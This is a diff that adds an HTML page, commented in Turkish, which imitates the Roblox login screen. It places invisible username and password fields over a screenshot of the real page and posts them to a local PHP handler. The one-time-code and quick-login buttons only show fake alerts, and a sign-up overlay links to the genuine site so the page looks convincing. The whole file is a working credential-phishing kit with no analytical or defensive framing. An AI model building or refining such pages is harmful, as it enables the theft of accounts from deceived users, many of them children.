@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Giriş</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #0b0e11;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Form elemanlarını resimle birlikte sabitleyen ana kapsayıcı */
+        .container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            max-width: 100vw;
+            max-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .tam-ekran-resim {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+        }
+
+        /* Tüm input ve butonların ortak bağımsız yerleşim kuralları */
+        .container input, .container button, .container a {
+            position: absolute;
+            width: 19.5%; /* Genişlikleri resimdeki gri kutularla eşitlendi */
+            height: 38px; /* Sabit piksel yüksekliği verilerek taşma önlendi */
+            left: 50%;
+            transform: translateX(-50%);
+            background: transparent;
+            border: none;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        /* Yazı yazılan input alanlarının özel ayarları (Yazıyı tam ortalar) */
+        .container input {
+            color: #ffffff;
+            font-size: 14px;
+            padding: 0 12px;
+            line-height: 38px; /* Yazının dikeyde tam ortalanmasını sağlar */
+            height: 38px;
+        }
+
+        /* Tıklanabilir buton ve linklerin ayarı */
+        .container button, .container a {
+            cursor: pointer;
+        }
+
+        /* ============================================================ */
+        /* MİLİMETRİK KONUMLANDIRMA (Yukarıdan aşağıya piksel/oran ayarları) */
+        /* ============================================================ */
+
+        /* 1. KUTU: Username Giriş Alanı */
+        .username-field {
+            top: 34%; 
+        }
+
+        /* 2. KUTU: Password Giriş Alanı */
+        .password-field {
+            top: 39.65%; 
+        }
+
+        /* 3. BUTON: Log In Butonu */
+        .login-btn {
+            top: 45.5%; 
+        }
+
+        /* 4. BUTON: Send me the one-time code by email */
+        .one-time-code-btn {
+            top: 57.5%; 
+            height: 42px; /* Bu buton biraz daha kalın olduğu için yükseltildi */
+        }
+
+        /* 5. BUTON: Quick Login */
+        .quick-login-btn {
+            top: 62.5%; 
+            height: 42px;
+        }
+
+        /* 6. LİNK: En alttaki Sign Up yazısı */
+        .signup-link {
+            top: 69.5%;
+            height: 25px;
+            width: 5%; /* Sadece "Sign up" kelimesinin üzerine gelmesi için daraltıldı */
+            left: 58%; /* Kelimenin sağda durma hizasına göre ayarlandı */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Arka plan resmi -->
+        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">
+
+        <!-- Form Elemanları (Hepsi bağımsız olarak resmin üzerine çivilendi) -->
+        <form action="giris_islem.php" method="POST">
+            
+            <!-- Kullanıcı adı alanı -->
+            <input type="text" name="username" class="username-field" required autocomplete="off">
+            
+            <!-- Şifre alanı -->
+            <input type="password" name="password" class="password-field" required>
+            
+            <!-- Giriş yap butonu -->
+            <button type="submit" class="login-btn" title="Giriş Yap"></button>
+            
+        </form>
+
+        <!-- Ekstra Fonksiyonel Butonlar ve Linkler -->
+        <button type="button" class="one-time-code-btn" onclick="alert('Kod istendi.')"></button>
+        <button type="button" class="quick-login-btn" onclick="alert('Hızlı giriş aktif.')"></button>
+        <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
+    </div>
+
+</body>
+</html>
